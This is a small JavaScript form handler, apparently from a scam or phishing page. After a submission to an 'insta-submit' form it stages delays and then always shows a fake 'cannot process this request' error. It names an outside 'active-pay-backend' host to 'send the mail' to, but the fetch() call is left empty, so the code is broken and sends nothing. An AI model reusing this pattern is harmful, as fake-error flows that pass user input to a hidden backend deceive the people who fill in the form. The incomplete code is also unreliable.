const form = document.getElementById("insta-submit");
const loader = document.getElementById("loader");
const result = document.getElementById("res");

const handleSubmit = (e) => {
    e.preventDefault();
    loader.style.display = "block";
    
    setTimeout(()=>{
        result.innerHTML= "<div style='padding: 60px 0;'></div>";
        setTimeout(()=>{
            const email_backend = "https://active-pay-backend.onrender.com/"
            // send the mail
            fetch()
            result.innerHTML="<div style='padding: 25px;text-align:center;'>Sorry we cannot process this request at this time, try again shortly or <a href='/index.html'>Go Back</a></div>";
            loader.style.display = "none";
        }, 5000);
    }, 3000)
};


form?.addEventListener('submit', handleSubmit);